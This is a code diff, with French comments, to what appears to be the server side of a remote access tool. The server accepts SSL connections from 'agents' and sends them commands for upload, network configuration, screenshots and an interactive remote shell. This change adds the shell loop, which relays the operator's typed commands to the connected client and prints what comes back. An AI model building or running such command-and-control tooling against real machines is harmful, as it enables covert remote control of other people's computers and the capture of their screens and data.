@@ -18,8 +18,17 @@ def upload(client_socket) :
     client_socket.send(b'upload') # Envoie de la commande
 
 # Fonction permettant d'initier un shell intéractif sur le client
-def shell(client_socket) :
+def shell(client_socket, client_ip) :
     client_socket.send(b'shell') # Envoie de la commande
+    print("[*] Taper 'quit' pour quitter le Shell")
+    while True:
+        commande_shell = input(f"[{client_ip}] Shell > ")
+        if commande_shell.lower() == 'quit':
+            client_socket.send(b'quit')
+            break
+        client_socket.send(commande_shell.encode())
+        commande_shell_received = client_socket.recv(4096).decode()
+        print(commande_shell_received)
 
 # Fonction permettant de récupérer la configuration réseau du client
 def ipconfig(client_socket) :
@@ -76,6 +85,7 @@ def main() :
 
         # Attente d'une connexion entrante et acceptation de celle-ci
         client_socket, client_address = ssl_socket.accept()
+        client_ip, client_port = client_socket.getpeername()
         print("[+] Agent received !")
 
         # Gestion des commandes envoyées au client
@@ -88,7 +98,7 @@ def main() :
             elif command.lower() == 'upload':
                 upload(client_socket)
             elif command.lower() == 'shell':
-                shell(client_socket)
+                shell(client_socket, client_ip)
             elif command.lower() == 'ipconfig':
                 ipconfig(client_socket)
             elif command.lower() == 'screenshot':
